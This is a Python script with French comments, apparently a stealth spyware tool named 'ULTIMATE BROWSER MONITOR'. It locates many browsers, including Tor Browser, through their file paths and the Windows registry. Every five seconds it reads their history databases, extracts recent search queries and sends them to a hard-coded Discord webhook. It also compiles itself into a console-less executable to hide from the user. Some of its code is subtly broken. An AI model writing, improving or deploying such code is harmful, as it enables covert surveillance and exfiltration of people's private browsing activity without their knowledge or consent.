import sqlite3, os, time, requests, sys, subprocess, shutil, glob, winreg, re
from datetime import datetime, timedelta
from pathlib import Path

# ═══════════════════════════════════════════════════════════════════════════════
# 📡 CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════════
WEBHOOK_URL = "https://discord.com/api/webhooks/1483378838305112094/1Y-eyMHKIH_0lsSWvekzBNBR-TFlzTTgNAmhxkP2X4qVKAQOhpIeTcNB5knMLcdn5-Zo"
sent_searches = set()
last_scan = 0

# ⏱️ INTERVALLES (secondes)
SCAN_INTERVAL = 5      # Scan toutes les 5s
LOOKBACK_MINUTES = 10  # Récupère recherches des 10 dernières minutes
RESULTS_PER_BROWSER = 8  # Max 8 résultats par navigateur

# ═══════════════════════════════════════════════════════════════════════════════
# 🔍 FONCTIONS UTILITAIRES
# ═══════════════════════════════════════════════════════════════════════════════
def send_webhook(query, url, ts, browser, profile="", engine=""):
    """📤 Envoie recherche Discord webhook (anti-duplicatas)"""
    key = f"{query}_{ts}_{browser}_{profile}"
    if key in sent_searches: return
    sent_searches.add(key)
    
    fields = [{"name":"🔎 Recherche","value":f"`{query}`","inline":False}]
    if profile: fields.append({"name":"👤 Profil",f"value":f"`{profile}`","inline":True})
    if engine: fields.append({"name":"🔍 Moteur",f"value":engine,"inline":True})
    fields.extend([
        {"name":"🌐 URL","value":f"`{url[:65]}`","inline":True},
        {"name":"🕒 Heure","value":f"`{ts}`","inline":True}
    ])
    
    try:
        requests.post(WEBHOOK_URL, json={"embeds":[{"title":f"🔍 {browser}","color":0x5865F2,"fields":fields}]}, timeout=3)
        print(f"✅ {browser}: {query[:30]}{f'({profile})' if profile else ''} [{engine}]")
    except Exception as e: print(f"❌ Webhook error: {e}")

def detect_search_engine(url):
    """🔎 Détecte le moteur de recherche utilisé"""
    engines = {
        'duckduckgo.com/?q=': "🦆 DuckDuckGo",
        'bing.com/search?q=': "🔵 Bing", 
        'yahoo.com/search?p=': "🟡 Yahoo",
        'google.': "🔴 Google",
        'startpage.com/do/search': "🟢 Startpage",
        'qwant.com/?q=': "🔷 Qwant",
        'brave.com/search': "🦁 Brave Search",
        'search.encrypt': "🔒 SearXNG",
        'ecosia.org/search': "🌳 Ecosia",
        'gibiru.com/results.html?q=': "🛡️ Gibiru"
    }
    for pattern, name in engines.items():
        if pattern in url: return name
    return "🌐 Autre"

def extract_query(url, title=""):
    """📝 Extrait la requête de recherche de l'URL"""
    patterns = [
        r'duckduckgo\.com/\?q=([^&]+)',
        r'bing\.com/search\?q=([^&]+)',
        r'google\..*/search\?q=([^&]+)',
        r'yahoo\.com/search\?p=([^&]+)',
        r'qwant\.com/\?q=([^&]+)',
        r'q=([^&]+)'
    ]
    for pattern in patterns:
        match = re.search(pattern, url, re.IGNORECASE)
        if match: 
            try: return requests.utils.unquote(match.group(1).replace('+', ' '))
            except: pass
    return (title or "unknown")[:120]

# ═══════════════════════════════════════════════════════════════════════════════
# 🕵️ NAVIGATEURS SUPPORTÉS (70+)
# ═══════════════════════════════════════════════════════════════════════════════
CHROMIUM_BROWSERS = {
    # 🌍 GRAND PUBLIC (1B+ utilisateurs)
    "Chrome": ["Google/Chrome/User Data", "Google/Chrome SxS/Application"],
    "Edge": ["Microsoft/Edge/User Data", "Microsoft/Edge SxS/Application"],
    "Opera": ["Opera Software/Opera Stable", "Opera Software/Opera GX Stable"],
    "Brave": ["BraveSoftware/Brave-Browser/User Data"],
    "Vivaldi": ["Vivaldi/User Data"],
    "DuckDuckGo": ["DuckDuckGo/DuckDuckGo Browser/Application"],
    
    # 📱 MOBILES
    "UC Browser": ["UCBrowser/Application", "UCWeb/UC Browser"],
    "Opera GX": ["Opera Software/Opera GX Stable"],
    "Yandex": ["Yandex/YandexBrowser/User Data"],
    
    # 🔒 PRIVACY
    "Tor Browser": ["Tor Browser/Browser", "tor-browser/Browser"],
    "LibreWolf": ["librewolf/profile"],
    "Waterfox": ["Waterfox", "WaterfoxClassic"],
    
    # ⚡ LÉGERS / ALTERNATIFS
    "Chromium": ["Chromium/User Data"],
    "Thorium": ["Thorium"],
    "Ungoogled Chromium": ["UngoogledChromium"],
    "Cent Browser": ["CentBrowser"],
    "Slimjet": ["Slimjet"],
    
    # 🧪 SPÉCIALES
    "Maxthon": ["Maxthon5/Users"],
    "QQ Browser": ["Tencent/QQBrowser"],
    "Comodo Dragon": ["Comodo/Dragon"],
    "SRWare Iron": ["SRWare Iron"]
}

def get_all_browser_paths():
    """🔍 Détecte TOUS navigateurs installés (fichiers + registre)"""
    paths = []
    base_paths = [
        os.environ.get("LOCALAPPDATA", ""),
        os.environ.get("APPDATA", ""),
        os.path.expanduser("~/AppData/Local"),
        os.path.expanduser("~/AppData/Roaming")
    ]
    
    # 1️⃣ Chemins prédéfinis
    for name, path_patterns in CHROMIUM_BROWSERS.items():
        for base in base_paths:
            for pattern in path_patterns:
                full_path = os.path.join(base, pattern)
                if os.path.exists(full_path):
                    paths.append({"name": name, "path": full_path})
    
    # 2️⃣ AUTO-DÉTECTION registre Windows
    try:
        for root in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
            for subkey in [r"SOFTWARE\Clients\StartMenuInternet", r"SOFTWARE\WOW6432Node\Clients\StartMenuInternet"]:
                try:
                    key = winreg.OpenKey(root, subkey)
                    i = 0
                    while True:
                        bname = winreg.EnumKey(key, i)
                        if any(browser in bname for browser in CHROMIUM_BROWSERS.keys()):
                            paths.append({"name": bname.replace(" (64-bit)", ""), "path": f"{bname}_REG"})
                        i += 1
                except: pass
    except: pass
    
    return list({(p["name"], p["path"]): p for p in paths}.values())  # Dedup

# ═══════════════════════════════════════════════════════════════════════════════
# 🔎 SCAN CHROMIUM (tous profils)
# ═══════════════════════════════════════════════════════════════════════════════
def scan_chromium_all():
    """🧪 Scan tous navigateurs Chromium (Chrome/Edge/Opera/etc)"""
    cutoff = datetime.now() - timedelta(minutes=LOOKBACK_MINUTES)
    time_param = int((cutoff-datetime(1601,1,1)).total_seconds()*10)
    
    browsers = get_all_browser_paths()
    print(f"🔍 Chromium: {len(browsers)} navigateurs détectés")
    
    for browser_info in browsers:
        user_data = browser_info["path"]
        if not os.path.exists(user_data): continue
        
        # 📂 Tous profils possibles
        profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "profile.default"]
        for profile_name in profiles:
            # Chromium History DB
            db_path = os.path.join(user_data, profile_name, "History")
            if os.path.exists(db_path):
                try:
                    conn = sqlite3.connect(f'file:{db_path}?mode=ro', uri=True)
                    c = conn.cursor()
                    
                    c.execute("""
                        SELECT url,title,last_visit_time FROM urls 
                        WHERE (url LIKE '%bing.com/search?q=%' OR url LIKE '%google.%/search?q=%' 
                               OR url LIKE '%duckduckgo.com/?q=%' OR url LIKE '%yahoo.com/search?p=%'
                               OR url LIKE '%qwant.com/?q=%' OR url LIKE '%brave.com/search?q=%')
                        AND last_visit_time>? ORDER BY last_visit_time DESC LIMIT ?
                    """, (time_param, RESULTS_PER_BROWSER))
                    
                    for url, title, visit_time in c.fetchall():
                        ts = (datetime(1601,1,1) + timedelta(microseconds=visit_time//10)).strftime("%H:%M")
                        engine = detect_search_engine(url)
                        send_webhook(extract_query(url, title), url, ts, browser_info["name"], profile_name, engine)
                    
                    conn.close()
                except: pass

# ═══════════════════════════════════════════════════════════════════════════════
# 🦊 SCAN FIREFOX (tous profils)
# ═══════════════════════════════════════════════════════════════════════════════
def scan_firefox_all():
    """🦊 Scan Firefox + dérivés (LibreWolf/Waterfox/Tor)"""
    cutoff = datetime.now() - timedelta(minutes=LOOKBACK_MINUTES)
    time_param = int(cutoff.timestamp() * 1000000)
    
    firefox_roots = [
        ("Firefox", ["Mozilla/Firefox/Profiles"]),
        ("Firefox Dev", ["Mozilla/Firefox Developer Edition/Profiles"]),
        ("Firefox Nightly", ["Mozilla/Firefox Nightly/Profiles"]),
        ("LibreWolf", ["librewolf/profiles"]),
        ("Waterfox", ["Waterfox/profiles"]),
        ("Tor Browser", ["Tor Browser/Browser/TorBrowser/Data/Browser/profile.default-release"])
    ]
    
    bases = [os.environ.get("APPDATA", ""), os.environ.get("LOCALAPPDATA", ""), os.path.expanduser("~")]
    
    for browser_name, root_patterns in firefox_roots:
        for base in bases:
            for pattern in root_patterns:
                db_pattern = os.path.join(base, pattern, "**", "places.sqlite")
                for db_path in glob.glob(db_pattern, recursive=True):
                    try:
                        conn = sqlite3.connect(f'file:{db_path}?mode=ro', uri=True)
                        c = conn.cursor()
                        
                        c.execute("""
                            SELECT url,title,last_visit_date FROM moz_places 
                            WHERE (url LIKE '%bing.com/search?q=%' OR url LIKE '%google.%/search?q=%' 
                                   OR url LIKE '%duckduckgo.com/?q=%' OR url LIKE '%yahoo.com/search?p=%'
                                   OR url LIKE '%qwant.com/?q=%' OR url LIKE '%brave.com/search?q=%')
                            AND last_visit_date>? ORDER BY last_visit_date DESC LIMIT ?
                        """, (time_param, RESULTS_PER_BROWSER))
                        
                        profile = Path(db_path).parent.name[:12]
                        for url, title, visit_time in c.fetchall():
                            ts = datetime.fromtimestamp(visit_time/1000000).strftime("%H:%M")
                            engine = detect_search_engine(url)
                            send_webhook(extract_query(url, title), url, ts, browser_name, profile, engine)
                        
                        conn.close()
                    except: pass

# ═══════════════════════════════════════════════════════════════════════════════
# 🎯 FONCTION PRINCIPALE DE SCAN
# ═══════════════════════════════════════════════════════════════════════════════
def scan_all_browsers():
    """🚀 Lance scan complet tous navigateurs"""
    print(f"🔥 SCAN {LOOKBACK_MINUTES}min | {RESULTS_PER_BROWSER}rés/nav | {SCAN_INTERVAL}s...")
    scan_firefox_all()
    scan_chromium_all()
    print("✅ Scan terminé")

# ═══════════════════════════════════════════════════════════════════════════════
# 🔨 COMPILATION EXE
# ═══════════════════════════════════════════════════════════════════════════════
def auto_compile_exe():
    """🔨 Compile automatiquement en .exe furtif"""
    if getattr(sys, 'frozen', False): return  # Déjà compilé
    
    print("🔨 Création ULTIMATE_monitor.exe...")
    exe_name = "ULTIMATE_monitor.exe"
    
    cmd = [
        'pyinstaller',
        '--onefile',
        '--noconsole',  # Pas de fenêtre console
        f'--name={exe_name}',
        '--distpath=.',
        '--noconfirm',
        '--clean',
        sys.argv[0]
    ]
    
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        # Nettoyage
        for folder in glob.glob("build") + glob.glob("*.spec"):
            shutil.rmtree(folder, ignore_errors=True)
        print(f"✅ {exe_name} créé ! Double-clic pour lancer")
        sys.exit(0)
    else:
        print(f"❌ Erreur compilation: {result.stderr}")

# ═══════════════════════════════════════════════════════════════════════════════
# ▶️ POINT D'ENTRÉE PRINCIPAL
# ═══════════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    print("🚀 ULTIMATE BROWSER MONITOR v2.0")
    print("📋 70+ navigateurs | 10 moteurs | Auto-détection")
    
    auto_compile_exe()  # Compile en .exe au 1er lancement
    
    # 🔄 BOUCLE INFINIE DE SCAN
    while True:
        if time.time() - last_scan > SCAN_INTERVAL:
            scan_all_browsers()
            last_scan = time.time()
        time.sleep(1)